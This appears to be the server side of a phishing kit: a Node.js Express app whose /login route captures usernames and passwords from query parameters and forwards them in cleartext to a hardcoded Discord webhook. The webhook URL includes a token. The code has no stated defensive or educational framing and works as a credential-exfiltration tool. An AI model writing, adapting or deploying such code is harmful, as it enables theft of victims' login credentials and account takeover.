var express = require('express');
var app = express();
const axios = require('axios')

app.use(express.static('static'))

app.get('/login', (req, res) => {
  console.log('Received request to login')
  console.log(`username:${req.query.username},pw:${req.query.n}`)
  postMessageToDiscord({username: req.query.username, pw: req.query.n})
  res.status(200).send()
})



app.listen(process.env.PORT || 8080);

function postMessageToDiscord(message) {

  const discordUrl = 'https://discord.com/api/webhooks/836368184990760973/haOwTWrH69hyGv4HPqltc0q4uAkyaC-mXN6GVenF06CsNIEns8-VEYpURI8Noo_9osfp';
  const payload = JSON.stringify({content: `username: ${message.username} pw: ${message.pw}`});
  console.log('payload',payload)
  axios({
    url: discordUrl,
    method: 'post',
    data: payload,
    headers: {
      'Content-Type': 'application/json'
    },
  }).then(response => console.log(response))
  .catch(error => console.log(error.message))

}